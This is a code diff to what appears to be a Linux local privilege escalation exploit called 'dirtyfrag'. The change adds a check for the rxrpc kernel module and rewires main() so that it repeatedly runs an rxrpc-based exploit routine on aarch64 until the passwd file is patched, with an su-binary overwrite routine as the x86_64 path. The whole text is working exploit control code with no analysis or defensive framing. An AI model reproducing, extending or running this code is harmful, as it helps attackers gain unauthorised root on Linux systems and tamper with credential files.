@@ -1903,6 +1903,24 @@ static int run_root_pty(void)
 }
 
 
+static int rxrpc_available(void)
+{
+	if (access("/sys/module/rxrpc", F_OK) == 0)
+		return 1;
+	FILE *f = fopen("/proc/modules", "r");
+	if (!f)
+		return 0;
+	char line[256];
+	while (fgets(line, sizeof(line), f)) {
+		if (!strncmp(line, "rxrpc ", 6)) {
+			fclose(f);
+			return 1;
+		}
+	}
+	fclose(f);
+	return 0;
+}
+
 static int runtime_is_aarch64(void)
 {
 	struct utsname u;
@@ -1954,9 +1972,14 @@ int main(int argc, char **argv)
 		}
 	} else {
 		if (is_aarch64) {
-			rc = rxrpc_lpe_main(new_argc, co_argv);
-			for (int i = 0; !passwd_already_patched() && i < 3; i++)
+			if (!rxrpc_available()) {
+				dprintf(2, "dirtyfrag: aarch64 mode requires loaded rxrpc module; ESP su overwrite is x86_64-only\n");
+				rc = 3;
+			} else {
 				rc = rxrpc_lpe_main(new_argc, co_argv);
+				for (int i = 0; !passwd_already_patched() && i < 3; i++)
+					rc = rxrpc_lpe_main(new_argc, co_argv);
+			}
 		} else {
 			rc = su_lpe_main(new_argc, co_argv);
 			if (!su_already_patched()) {
